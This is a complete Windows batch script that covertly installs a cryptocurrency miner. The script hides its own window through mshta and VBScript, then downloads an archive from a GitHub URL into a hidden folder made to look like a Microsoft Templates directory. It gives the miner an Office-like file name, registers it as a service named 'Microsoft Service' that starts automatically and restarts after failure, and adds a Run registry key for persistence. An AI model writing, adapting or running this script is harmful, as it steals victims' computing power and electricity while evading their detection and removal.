@echo off
setlocal enabledelayedexpansion

:: Hidden Window Execution
if "%~1"=="hidden" goto :main
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c """"%~f0"" hidden"", 0, false"^)
exit /b

:main
:: Single Instance Check
tasklist /FI "IMAGENAME eq Microsoft@OfficeTempletes.exe" 2>NUL | find /I "Microsoft@OfficeTempletes.exe" >NUL
if %ERRORLEVEL% equ 0 exit /b

:: Configuration
set "MINER_DIR=%ProgramData%\Microsoft\Windows\Templates\mall"
set "MINER_EXE=Microsoft@OfficeTempletes.exe"
set "MALL_ZIP_URL=https://github.com/Drakovthe6th/TBuG/raw/master/mall.zip"
set "NSSM_URL=https://nssm.cc/release/nssm-2.24.zip"
set "SERVICE_NAME=Microsoft Service"
set "PRIORITY=Normal"
set "NSSM_INSTALL_DIR=%SystemRoot%\System32"

:: Create Hidden Directory
if not exist "%MINER_DIR%" (
    mkdir "%MINER_DIR%" >nul 2>&1
    if errorlevel 1 (
        echo [!] Failed to create directory: %MINER_DIR%
        timeout /t 3 >nul
        exit /b 1
    )
    attrib +s +h "%MINER_DIR%" >nul 2>&1
)

:: Download and Extract mall.zip
if not exist "%MINER_DIR%\%MINER_EXE%" (
    echo [*] Downloading package...
    set "ZIP_PATH=%MINER_DIR%\mall.zip"
    
    :: Download with PowerShell with error handling
    powershell -Command "$ErrorActionPreference = 'Stop';" ^
        "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" ^
        "(New-Object Net.WebClient).DownloadFile('%MALL_ZIP_URL%', '%ZIP_PATH%')"
    
    if not exist "%ZIP_PATH%" (
        echo [!] Download failed: %MALL_ZIP_URL%
        timeout /t 3 >nul
        exit /b 1
    )
    
    echo [*] Extracting package...
    powershell -Command "$ErrorActionPreference = 'Stop';" ^
        "Add-Type -Assembly System.IO.Compression.FileSystem;" ^
        "[IO.Compression.ZipFile]::ExtractToDirectory('%ZIP_PATH%', '%MINER_DIR%');" ^
        "Remove-Item '%ZIP_PATH%' -Force"
    
    if errorlevel 1 (
        echo [!] Extraction failed
        timeout /t 3 >nul
        exit /b 1
    )
    
    :: Hide all extracted files
    attrib +s +h "%MINER_DIR%\*" /s /d >nul 2>&1
)

:: Verify miner exists
if not exist "%MINER_DIR%\%MINER_EXE%" (
    echo [!] Miner executable missing: %MINER_DIR%\%MINER_EXE%
    timeout /t 3 >nul
    exit /b 1
)

:: Download and Install NSSM
echo [*] Installing service manager...
set "NSSM_ZIP=%MINER_DIR%\nssm.zip"

powershell -Command "$ErrorActionPreference = 'Stop';" ^
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" ^
    "(New-Object Net.WebClient).DownloadFile('%NSSM_URL%', '%NSSM_ZIP%')"

if not exist "%NSSM_ZIP%" (
    echo [!] NSSM download failed
    timeout /t 3 >nul
    exit /b 1
)

:: Create nssm extraction directory
set "NSSM_DIR=%MINER_DIR%\nssm"
mkdir "%NSSM_DIR%" >nul 2>&1

:: Extract NSSM
powershell -Command "$ErrorActionPreference = 'Stop';" ^
    "Add-Type -Assembly System.IO.Compression.FileSystem;" ^
    "[IO.Compression.ZipFile]::ExtractToDirectory('%NSSM_ZIP%', '%NSSM_DIR%');" ^
    "Remove-Item '%NSSM_ZIP%' -Force"

:: Find nssm.exe
set "NSSM_EXE="
for /f "delims=" %%i in ('dir /b /s "%NSSM_DIR%\nssm.exe" 2^>nul') do set "NSSM_EXE=%%i"

if not defined NSSM_EXE (
    echo [!] NSSM extraction failed
    timeout /t 3 >nul
    exit /b 1
)

:: Install NSSM to System32 for PATH access
echo [*] Installing NSSM to system PATH...
copy /y "%NSSM_EXE%" "%NSSM_INSTALL_DIR%\" >nul 2>&1
if errorlevel 1 (
    echo [!] Failed to copy NSSM to system directory
    timeout /t 2 >nul
) else (
    echo [*] NSSM added to system PATH
)

:: Install Service
echo [*] Creating %SERVICE_NAME% service...
nssm install "%SERVICE_NAME%" "%MINER_DIR%\%MINER_EXE%"
if errorlevel 1 (
    echo [!] Service installation failed
    timeout /t 3 >nul
    exit /b 1
)

nssm set "%SERVICE_NAME%" AppDirectory "%MINER_DIR%"
nssm set "%SERVICE_NAME%" AppParameters "--config=config.json"
nssm set "%SERVICE_NAME%" AppPriority %PRIORITY%
nssm set "%SERVICE_NAME%" Start SERVICE_AUTO_START
nssm set "%SERVICE_NAME%" DependOnService "Winmgmt"
nssm set "%SERVICE_NAME%" AppStopMethodSkip 6
nssm set "%SERVICE_NAME%" AppStopMethodConsole 1500
nssm set "%SERVICE_NAME%" AppNoConsole 1

:: Configure Service Recovery
sc failure "%SERVICE_NAME%" reset= 86400 actions= restart/60000/restart/60000 >nul

:: Start Service
echo [*] Starting service...
net start "%SERVICE_NAME%" >nul 2>&1
if errorlevel 1 (
    echo [!] Service start failed - will start on next boot
)

:: Create Registry Persistence
echo [*] Setting up persistence...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OfficeTemplates" /t REG_SZ /d "\"%MINER_DIR%\%MINER_EXE%\" --background" /f >nul

:: Cleanup
echo [*] Performing cleanup...
attrib +s +h "%MINER_DIR%\*" /s /d >nul 2>&1

echo [+] Deployment completed successfully
timeout /t 2 >nul
exit /b 0